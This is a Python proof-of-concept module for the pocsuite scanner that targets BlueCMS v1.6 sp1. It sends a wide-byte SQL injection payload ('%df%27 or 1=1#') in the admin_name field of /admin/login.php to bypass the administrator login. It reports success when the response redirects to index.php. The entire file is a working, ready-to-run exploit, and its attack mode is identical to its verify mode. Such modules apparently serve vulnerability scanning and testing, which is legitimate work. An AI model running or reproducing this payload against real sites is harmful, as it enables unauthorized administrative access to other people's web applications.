# -*- coding:utf-8 -*-
__author__ = 'jerry'


import requests
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

from pocsuite.thirdparty.urlparser import get_domain

class Bluecms_V1_6_Sp1_Admin_Sqli(POCBase):
    name = "BlueCMS v1.6 sp1 /admin/login.php SQL注入漏洞"
    vulID = ''
    author = ['']
    vulType = 'sqli'
    version = '1.0'
    references = ['']
    desc = ''''''
    vulDate = ''
    createDate = ''
    updateDate = ''
    appName = ''
    appVersion = ''
    appPowerLink = ''
    samples = []

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        try:
            if '://' not in self.url:
                self.url = 'http://' + self.url

            domain = get_domain(self.url)
            vuln_url = domain + '/admin/login.php?act=login'
            post_data = "admin_name=%df%27+or+1%3D1%23&admin_pwd=admin&submit=%B5%C7%C2%BC&act=do_login"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 '
                                     'Firefox/5.0', "Content-Type": "application/x-www-form-urlencoded"}
            response = requests.post(vuln_url, data=post_data, headers=headers, timeout=10)

            if bool(response.status_code == 200 and "location.replace('index.php')" in response.content):
                result = {'VerifyInfo': {}}
                result['VerifyInfo']['URL'] = vuln_url
        except Exception:
            print Exception

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(Bluecms_V1_6_Sp1_Admin_Sqli)
